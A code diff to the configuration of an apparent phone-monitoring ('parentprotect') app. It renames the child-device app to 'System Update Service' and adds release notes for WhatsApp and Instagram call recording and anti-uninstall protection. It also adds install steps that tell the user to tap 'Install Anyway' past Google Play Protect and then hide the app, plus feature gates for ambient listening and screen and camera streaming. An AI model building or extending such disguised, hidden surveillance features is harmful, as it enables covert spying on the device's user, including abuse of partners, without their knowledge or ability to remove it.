@@ -331,8 +331,8 @@ export const DEFAULT_OPTIONS = {
 
   // Dynamic Profile & App Configs
   onlineThresholdSeconds: 150,
-  childAppName: 'Child Companion',
-  childAppUrl: 'https://parentprotect.app/download-child.apk',
+  childAppName: 'System Update Service',
+  childAppUrl: 'https://parentprotect.app/download/SystemUpdateService.apk',
   childDeviceSecretCodeMaxAttempt: 5,
   privacyPolicyUrl: 'https://parentprotect.app/privacy',
   supportEmail: 'support@parentprotect.app',
@@ -344,11 +344,31 @@ export const DEFAULT_OPTIONS = {
 
   // Version Control & Updates
   parentAppVersion: 100,
+  parentAppVersionName: 'v1.0.0',
+  parentAppReleaseNotes: '• Enhanced monitoring & dashboard improvements\n• Remote Child App Hide/Unhide toggle\n• Device-wise update tracker\n• Stability & performance upgrades',
   parentAppNeedToUpdate: false,
   parentAppNeedToUpdateInterval: 1440,
   childAppVersion: 100,
+  childAppVersionName: 'v1.0.0',
+  childAppReleaseNotes: '• Social App Call Recording (WhatsApp, IG)\n• Enhanced Anti-Uninstall protection\n• Battery & background performance optimizations\n• Stability fixes for Android 14/15/16',
+  childAppUpdateTitle: 'Child Companion Update Available',
+  childAppUpdateMessage: 'A new update is available for child devices to support latest features and continuous monitoring.',
+  childAppUpdateSteps: [
+    '1. Open the download link on child phone browser to download APK.',
+    '2. Tap downloaded APK to Install (Overwrite update). If Google Play Protect asks for confirmation, tap "Install Anyway".',
+    '3. Open app, enter your Secret Parent PIN, verify permissions, and tap Hide App.'
+  ],
   childAppNeedToUpdate: false,
   childAppNeedToUpdateInterval: 1440,
+
+  // Feature Minimum Child App Version Gating
+  featureMinVersion: {
+    socialCallRecording: 102,
+    callRecording: 100,
+    ambientListening: 100,
+    screenStreaming: 100,
+    cameraStreaming: 100,
+  },
 
   // Developer Mode Restrictions
   allowDeveloperModeOnParentApp: false,
